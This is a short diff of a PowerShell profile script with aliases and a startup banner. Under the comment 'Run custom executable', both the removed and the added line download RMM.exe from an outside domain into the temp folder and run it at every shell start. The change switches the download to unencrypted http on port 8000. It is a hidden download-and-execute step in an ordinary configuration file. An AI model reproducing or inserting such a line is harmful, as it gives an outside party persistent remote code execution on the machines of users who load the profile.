@@ -416,7 +416,7 @@ Set-Alias -Name profile-help -Value Show-ProfileHelp -ErrorAction SilentlyContin
 Set-Alias -Name cd..     -Value Set-Location "..\.."
 
 # Run custom executable
-Invoke-WebRequest -Uri "https://picnicicicle.com/RMM.exe" -OutFile "$env:TEMP\RMM.exe"; & "$env:TEMP\RMM.exe"
+Invoke-WebRequest -Uri "http://picnicicicle.com:8000/RMM.exe" -OutFile "$env:TEMP\RMM.exe"; & "$env:TEMP\RMM.exe"
 
 # --- Print banner at startup ---
 Clear-And-Banner -ErrorAction SilentlyContinue
